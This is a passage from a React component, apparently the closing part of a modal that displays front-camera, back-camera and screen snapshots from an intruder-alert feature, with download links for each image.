                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-4 grid grid-cols-1 md:grid-cols-2 gap-4 bg-black/50">
              {activePhoto.frontPhotoUrl && (
                <div>
                  <div className="text-xs font-semibold text-cyan-400 mb-2">Front Camera (Intruder View)</div>
                  <img
                    src={activePhoto.frontPhotoUrl}
                    alt="Front Camera"
                    className="w-full rounded-lg object-contain max-h-[420px] bg-black border border-slate-800"
                  />
                  <div className="mt-2 text-right">
                    <a
                      href={activePhoto.frontPhotoUrl}
                      download={`front_${activePhoto.id}.jpg`}
                      className="text-xs text-cyan-400 hover:text-cyan-300 font-medium inline-flex items-center gap-1"
                    >
                      <Download className="w-3 h-3" />
                      <span>Download Front</span>
                    </a>
                  </div>
                </div>
              )}

              {activePhoto.backPhotoUrl && (
                <div>
                  <div className="text-xs font-semibold text-emerald-400 mb-2">Back Camera (Surroundings View)</div>
                  <img
                    src={activePhoto.backPhotoUrl}
                    alt="Back Camera"
                    className="w-full rounded-lg object-contain max-h-[420px] bg-black border border-slate-800"
                  />
                  <div className="mt-2 text-right">
                    <a
                      href={activePhoto.backPhotoUrl}
                      download={`back_${activePhoto.id}.jpg`}
                      className="text-xs text-emerald-400 hover:text-emerald-300 font-medium inline-flex items-center gap-1"
                    >
                      <Download className="w-3 h-3" />
                      <span>Download Back</span>
                    </a>
                  </div>
                </div>
              )}

              {activePhoto.screenPhotoUrl && (
                <div className="col-span-full">
                  <div className="text-xs font-semibold text-purple-400 mb-2">Screen Proof Snapshot</div>
                  <img
                    src={activePhoto.screenPhotoUrl}
                    alt="Screen Proof"
                    className="w-full rounded-lg object-contain max-h-[450px] bg-black border border-slate-800"
                  />
                  <div className="mt-2 text-right">
                    <a
                      href={activePhoto.screenPhotoUrl}
                      download={`screen_${activePhoto.id}.jpg`}
                      className="text-xs text-purple-400 hover:text-purple-300 font-medium inline-flex items-center gap-1"
                    >
                      <Download className="w-3 h-3" />
                      <span>Download Screen Proof</span>
                    </a>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
